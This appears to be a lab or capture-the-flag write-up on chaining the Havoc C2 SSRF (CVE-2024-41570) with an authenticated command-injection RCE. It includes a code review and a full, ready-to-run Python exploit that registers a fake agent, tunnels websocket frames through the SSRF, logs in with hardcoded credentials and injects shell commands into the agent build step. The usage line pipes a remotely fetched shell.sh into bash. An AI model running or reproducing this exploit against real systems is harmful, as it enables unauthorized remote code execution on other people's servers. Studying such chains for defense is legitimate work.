---
description: Chaining CVE-2024-41570 SSRF with a RCE using websockets.
---

# Havoc SSRF with RCE

### <mark style="color:yellow;">The PoC's</mark>

1. &#x20;Poc is the SSRF\
   [https://github.com/chebuya/Havoc-C2-SSRF-poc/tree/main](https://github.com/chebuya/Havoc-C2-SSRF-poc/tree/main)\
   [https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/)
2. RCE\
   [https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc\_auth\_rce](https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce)

{% hint style="danger" %}
It is using the SSRF script to create a tcp socket, which is used to read/write data. In the SSRF script we find the write\_socket and read\_socket functions to send data. With that we can send http requests to 127.0.0.1/havoc/. The RCE script uses websockets, so we use the http request to upgrade to websockets and then format the json data into websocket frame and then we send that frame using the write\_socket function.
{% endhint %}

### <mark style="color:yellow;">The first CVE-2024-41570 SSRF</mark>

This vulnerability is a vulnerability in which unauthenticated attackers could create a TCP socket on the teamserver with any any IP/port, and read and write traffic through the socket. This could lead to leaking IP of the teamserver, routing traffic through listening socks proxies.

1. Register a fake agent with teamserver
2. Use the COMMAND\_SOCKET functionality to create a socket
3. Read/write to that socket to communicate with arbitrary targets

<details>

<summary>Minor code review</summary>

```python
Listener Initialization
When the teamserver starts or new listeners are added, ListenerStart function configures and initiates the listeners. Within this function, the Start() method is invoked to set up the HTTP/S server.
func (t *Teamserver) ListenerStart(ListenerType int, info any) error {
    // ... other code ...
    switch ListenerType {
    case handlers.LISTENER_HTTP:
        var HTTPConfig = handlers.NewConfigHttp()
        var config = info.(handlers.HTTPConfig)
        HTTPConfig.Config = config
        HTTPConfig.Config.Secure = config.Secure
        HTTPConfig.Teamserver = t
        HTTPConfig.Start()
    }
    // ... other code ...
}
Request Handling
In the Start() function, all incoming POST requests are directed to the h.request handler.
func (h *HTTP) Start() {
    logger.Debug("Setup HTTP/s Server")
    if len(h.Config.Hosts) == 0 && h.Config.PortBind == "" && h.Config.Name == "" {
        logger.Error("HTTP Hosts/Port/Name not set")
        return
    }
    h.GinEngine.POST("/*endpoint", h.request)
    // ... other code ...
}
Processing Incoming Requests
The h.request function reads the body of the POST request and performs checks on the request path and User-Agent header. If these checks pass, the request body is passed to the parseAgentRequest function for further processing.
func (h *HTTP) request(ctx *gin.Context) {
    Body, err := io.ReadAll(ctx.Request.Body)
    if err != nil {
        logger.Debug("Error while reading request: " + err.Error())
    }
    // ... validation checks ...
    if Response, Success := parseAgentRequest(h.Teamserver, Body, ExternalIP); Success {
        _, err := ctx.Writer.Write(Response.Bytes())
        if err != nil {
            logger.Debug("Failed to write to request: " + err.Error())
            h.fake404(ctx)
            return
        }
    } else {
        logger.Warn("failed to parse agent request")
        h.fake404(ctx)
        return
    }
    ctx.AbortWithStatus(http.StatusOK)
    return
}
Parsing Agent Requests
The parseAgentRequest function extracts the agent header from the POST data and checks for specific "magic bytes" to determine if the callback is from a Demon agent or a third-party agent. For Demon agents, the magic value is 0xdeadbeef.
func ParseHeader(data []byte) (Header, error) {
    var Header = Header{}
    Parser := parser.NewParser(data)
    if Parser.Length() > 4 {
        Header.Size = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse package size")
    }
    if Parser.Length() > 4 {
        Header.MagicValue = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse magic value")
    }
    // ... other parsing ...
    return Header, nil
}
Parsing the Header
The ParseHeader function reads specific segments of the POST data to populate the Header structure, including fields like Size, MagicValue, AgentID, and Data.
func ParseHeader(data []byte) (Header, error) {
    var Header = Header{}
    Parser := parser.NewParser(data)
    if Parser.Length() > 4 {
        Header.Size = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse package size")
    }
    if Parser.Length() > 4 {
        Header.MagicValue = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse magic value")
    }
    // ... other parsing ...
    return Header, nil
}
Handling Demon Agents:
If the MagicValue matches 0xdeadbeef, the handleDemonAgent function processes the request. This includes handling agent registration and job retrieval.
func handleDemonAgent(Teamserver agent.TeamServer, Header agent.Header, ExternalIP string) (bytes.Buffer, bool) {
    // ... code to handle demon agent ...
    if !Teamserver.AgentExist(Header.AgentID) {
        // ... code to register new agent ...
    }
    // ... other code ...
    return bytes.Buffer{}, true
}
```

</details>

### <mark style="color:yellow;">Demon Agent</mark>

In havoc the Demon is the default agent which is deployed on compromised systems. Each agent type has backend code called a "handler" which processes and respons to messages (callbacks) from an agent. The handler become vulnerable when C2 operators create a listener which is over HTTP/HTTPS on port 80 or 443.

<details>

<summary>More on the agent</summary>

#### 1 . Agent registration

When the teamserver starts or a new listener is added, the `ListenerStart` function sets up and starts the listeners. This function ends by calling Start().

#### 2. Handling POST Requests:

&#x20;The `Start() function` is set up to send all POST requests to a function called h.request. It reads the request body into a variable called `Body` and performs basic checks on the request path and the User-Agent header.

#### 3. Initial Request Processing

When a POST request comes in, `h.request` reads the request body and checks if the URL path and browser info (User-Agent) are valid. If these checks pass, it sends the data to `parseAgentRequest`.

#### 4. Parsing Agent Requests

`parseAgentRequest` looks for special identifier bytes (called magic bytes) in the request. It's looking for "0xdeadbeef" to identify if this is a demon agent trying to connect. This value is public knowledge, so it's easy to fake.

#### 5. Header Structure

The `ParseHeader` function reads the request data in 4-byte chunks:

* The first 4 bytes define the size of the header (`Header.Size`).
* Bytes 4–8 contain the magic value (`Header.MagicValue`).
* Bytes 8–12 hold the agent ID (`Header.AgentID`).
* The remaining data is assigned to `Header.Data`.

#### 6. Agent Registration

If the magic value matches `0xdeadbeef`, the server checks if this agent ID exists. If it's new, it treats it as a registration attempt. It looks for Command value 99 (DEMON\_INIT) and then creates a new agent profile.

#### 7. Handling Agent Data

During registration, the server first reads encryption keys (AESKey and AESIv). Everything after these keys is encrypted. The server decrypts this data to get agent information like hostname, username, etc. Then it adds the new agent to its list.

#### Why Register an Agent?

Once an agent is registered it bypasses the server's authentication checks. Once registered, the agent gains access to further server functionality.

#### 8. Post-Registration Access

After registration, we can access any functionality that checks for `AgentExist(Header.AgentID)`. And now its possible to send socket-related commands like  `COMMAND_SOCKET` which leads to:

* Open network connections
* Write data to these connections
* Read responses back
* All from the server's location

</details>

{% hint style="info" %}
The SSRF vulnerablity in short

```python
# Step 1: Register fake agent
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

# Step 2: Create socket
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

# Step 3: Send HTTP request
request_data = b"GET /vulnerable HTTP/1.1\r\n..."
write_socket(socket_id, request_data)

# Step 4: Get response
print(read_socket(socket_id).decode())
```
{% endhint %}

## Havoc RCE

<details>

<summary>The code</summary>

```python
import hashlib
import json
import ssl
from websocket import create_connection # pip install websocket-client

HOSTNAME = "192.168.167.129"
PORT = 40056
USER = "Neo"
PASSWORD = "password1234"

ws = create_connection(f"wss://{HOSTNAME}:{PORT}/havoc/",
                       sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})

# Authenticate to teamserver
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
ws.send(json.dumps(payload))
print(json.loads(ws.recv()))

# Create a listener to build demon agent for
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
ws.send(json.dumps(payload))

# Create a psuedo shell with RCE loop
while True:
    cmd = input("$ ")
    injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""

    # Command injection in demon compilation command
    payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
        "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
    ws.send(json.dumps(payload))
    while True:
        bla = ws.recv()
        if b"compile output" in bla:
            bla2 = json.loads(bla)
            # print(bla2)
            out = bla2["Body"]["Info"]["Message"].split("\n")
            # print(out)

            for line in out[1:]:
                print(line)
            break

ws.close()
```

</details>

It start with importing the libraries and credentials needed for teamserver

```python
import hashlib
import json
import ssl
from websocket import create_connection

HOSTNAME = "192.168.167.129"
PORT = 40056
USER = "Neo"
PASSWORD = "password1234"
```

Creates a secure wss:// WebSocket connection, ignores SSL.

```python
ws = create_connection(f"wss://{HOSTNAME}:{PORT}/havoc/",
                      sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})
```

Authentication, SHA3-256 password hashes

```python
payload = {
    "Body": {
        "Info": {
            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
            "User": USER
        },
        "SubEvent": 3
    },
    "Head": {
        "Event": 1,
        "OneTime": "",
        "Time": "18:40:17",
        "User": USER
    }
}

# Send json using WS to server
ws.send(json.dumps(payload))
```

Create a listener on on HTTPS port 443 binding to all interfaces

```python
payload = {
    "Body":{
        "Info":{
            "HostBind":"0.0.0.0",
            "Name":"abc",
            "PortBind":"443",
            "Protocol":"Https",
            "Secure":"true"
            # ... other settings
        },
        "SubEvent":1
    },
    "Head":{"Event":2}
}
```

Command injection loop

```python
while True:
    cmd = input("$ ")
    injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
    
    payload = {
        "Body": {
            "Info": {
                "AgentType": "Demon",
                "Config": "... Service Name\":\"" + injection + "\"..."
            }
        }
    }
```

## Chaining the Scripts

First we have to add 2 functions. The websocket request and the websocket frame. The `def create_websocket_request`. This builds the HTTP GET request to upgrade to WebSocket.

```python
def create_websocket_request(host, port):
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request
```

The second function is the `build_websocket_frame` which creates a WebSocket frame to send a payload over an openen WebSocket connection. This is the standard way WebSocket requires messages to be formatted before sending them over the network. In this case we will format JSON data which Havoc uses to WebSocket format.

```python
def build_websocket_frame(payload):
    data = payload.encode("utf-8")
    frame = bytearray([0x81])  # FIN + Text frame
    
    # Handle length
    if len(data) <= 125:
        frame.append(0x80 | len(data))
    elif len(data) <= 65535:
        frame.extend([0x80 | 126] + list(len(data).to_bytes(2, 'big')))
    else:
        frame.extend([0x80 | 127] + list(len(data).to_bytes(8, 'big')))
    
    # Mask data
    mask = os.urandom(4)
    frame.extend(mask)
    frame.extend(b ^ mask[i % 4] for i, b in enumerate(data))
    
    return bytes(frame)
```

## Total working script

```bash
# Usage 
python3 script.py -t "http://target:80" -i "127.0.0.1" -p "40056" -c "curl http://10.10.10.14/shell.sh | bash"
```

Full script

```python
import os
import json
import hashlib
import binascii
import random
import requests
import argparse
import urllib3
from Crypto.Cipher import AES
from Crypto.Util import Counter
import asyncio

# Disable HTTPS certificate warnings
urllib3.disable_warnings()

# The size of the AES key in bytes
key_bytes = 32

def decrypt(key, iv, ciphertext):
    """
    Decrypt the given ciphertext using AES in CTR mode with the provided key and IV.
    The key is padded with b'0' if its length is less than 32 bytes.
    """
    # If the key is shorter than key_bytes (32 bytes), pad it with b'0'.
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    # The final key length must match key_bytes
    assert len(key) == key_bytes

    # Convert the IV from bytes to a large integer
    iv_int = int(binascii.hexlify(iv), 16)

    # Create a Counter object for CTR mode using the IV integer
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)

    # Create AES-CTR cipher object
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Decrypt the ciphertext
    plaintext = aes.decrypt(ciphertext)
    return plaintext


def encrypt(key, iv, plaintext):
    """
    Encrypt the given plaintext using AES in CTR mode with the provided key and IV.
    The key is padded with b'0' if its length is less than 32 bytes.
    """
    # If the key is shorter than key_bytes (32 bytes), pad it with b'0'.
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        # Convert the IV from bytes to a large integer
        iv_int = int(binascii.hexlify(iv), 16)

        # Create a Counter object for CTR mode using the IV integer
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)

        # Create AES-CTR cipher object
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        # Encrypt the plaintext
        ciphertext = aes.encrypt(plaintext)
        return ciphertext


def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)


def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    command = b"\x00\x00\x00\x63"    # Command for registering an agent
    request_id = b"\x00\x00\x00\x01" # Arbitrary request ID
    demon_id = agent_id              # Global agent ID

    # Convert lengths to bytes (4 bytes, big-endian)
    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    # Padding data (seems to be a fixed filler of 100 bytes)
    data = b"\xab" * 100

    # Build the header data as specified
    header_data = (
        command + request_id + AES_Key + AES_IV + demon_id +
        hostname_length + hostname +
        username_length + username +
        domain_name_length + domain_name +
        internal_ip_length + internal_ip +
        process_name_length + process_name +
        process_id + data
    )

    # Calculate the size of the entire package (12 bytes overhead + header_data)
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')

    # Construct the final agent header
    agent_header = size_bytes + magic + agent_id

    print(agent_header + header_data)
    print("[***] Trying to register agent...")

    # Send a POST request to the teamserver
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_socket(socket_id, target_address, target_port):
    """
    Open a socket on the teamserver by sending the appropriate command
    with the provided socket_id, target_address, and target_port.
    """
    # Socket open command constants
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"

    # Reverse the order of target_address octets for the forward_addr
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    # Convert target_port to bytes
    forward_port = int_to_bytes(target_port)

    # Build the subcommand package
    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
    package_size = int_to_bytes(len(package) + 4)

    # Encrypt the package and build header data
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    # Calculate final size
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to open socket on the teamserver...")
    # Send the request
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def write_socket(socket_id, data):
    """
    Write data to the specified socket_id on the teamserver.
    This constructs and sends the correct command structure for socket write.
    """
    # Socket write command constants
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    # Prepare the data length in bytes
    data_length = int_to_bytes(len(data))

    # Build the subcommand package
    package = subcommand + socket_id + socket_type + success + data_length + data
    package_size = int_to_bytes(len(package) + 4)

    # Encrypt and build header data
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    # Calculate final size
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print(post_data)
    print("[***] Trying to write to the socket")
    # Send the request
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")


def read_socket(socket_id):
    """
    Read data from the specified socket_id on the teamserver.
    This polls the teamserver for new data and decrypts the response.
    """
    # Socket read command constants
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    # Build the header data
    header_data = command + request_id

    # Calculate final size
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to poll teamserver for socket output...")
    # Send the request
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return b""

    # Parse the response to extract encrypted data
    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    # Decrypt and return data (trimming the first 12 bytes after decryption)
    return decrypt(AES_Key, AES_IV, enc_package)[12:]


# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-c", "--command", help="The command to execute", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent",
                    default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()

# Global magic bytes 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target

# HTTP header agent spoofing
headers = {
    "User-Agent": args.user_agent
}

# Randomly generated agent ID
agent_id = int_to_bytes(random.randint(100000, 1000000))

# Global AES key and IV (currently just zeroed out)
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16

# Convert spoofed agent details to bytes as needed
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

# Register the agent with the teamserver
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

"""
Build a standard WebSocket handshake HTTP request.
"""
def create_websocket_request(host, port):

    ws_key = "5NUvQyzkv9bpu376gKd2Lg=="
    
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request

"""
Formats data/text for WebSocket 
"""
def build_websocket_frame(payload):
    data = payload.encode("utf-8")
    frame = bytearray([0x81])  # FIN + Text frame
    
    # Handle length
    if len(data) <= 125:
        frame.append(0x80 | len(data))
    elif len(data) <= 65535:
        frame.extend([0x80 | 126] + list(len(data).to_bytes(2, 'big')))
    else:
        frame.extend([0x80 | 127] + list(len(data).to_bytes(8, 'big')))
    
    # Mask data
    mask = os.urandom(4)
    frame.extend(mask)
    frame.extend(b ^ mask[i % 4] for i, b in enumerate(data))
    
    return bytes(frame)

"""
Send json data in WebSocket format
"""
def send_payload(socket_id, payload):
    payload_json = json.dumps(payload)
    frame = build_websocket_frame(payload_json)
    write_socket(socket_id, frame)
    response = read_socket(socket_id)

# Credentials/hosts
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
host = "127.0.0.1"
port = 40056

# 1. Create a WebSocket handshake, upgrade from HTTP to WebSocket, establish connection.
websocket_request = create_websocket_request(host, port)
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)

# 2. Authenticate to teamserver
payload = payload = {"Body":{"Info":{"Password":hashlib.sha3_256(PASSWORD.encode()).hexdigest(),"User":USER},"SubEvent":3},"Head":{"Event":1,"OneTime":"","Time":"18:40:17","User":USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
print(read_socket(socket_id))

# 3. Send a payload with command injection in a service name
injection = """ \\\\\\\" -mbla; """ + args.command + """ 1>&2 && false #"""
payload = payload = {"Body":{"Info":{"AgentType":"Demon","Arch":"x64","Config":"{\"Amsi/Etw Patch\":\"None\",\"Indirect Syscall\":false,\"Injection\":{\"Alloc\":\"Native/Syscall\",\"Execute\":\"Native/Syscall\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\"},\"Jitter\":\"0\",\"Proxy Loading\":\"None (LdrLoadDll)\",\"Service Name\":\""+injection+"\",\"Sleep\":\"2\",\"Sleep Jmp Gadget\":\"None\",\"Sleep Technique\":\"WaitForSingleObjectEx\",\"Stack Duplication\":false}","Format":"Windows Service Exe","Listener":"zen"},"SubEvent":2},"Head":{"Event":5,"OneTime":"true","Time":"18:39:04","User":USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
print(read_socket(socket_id))
```

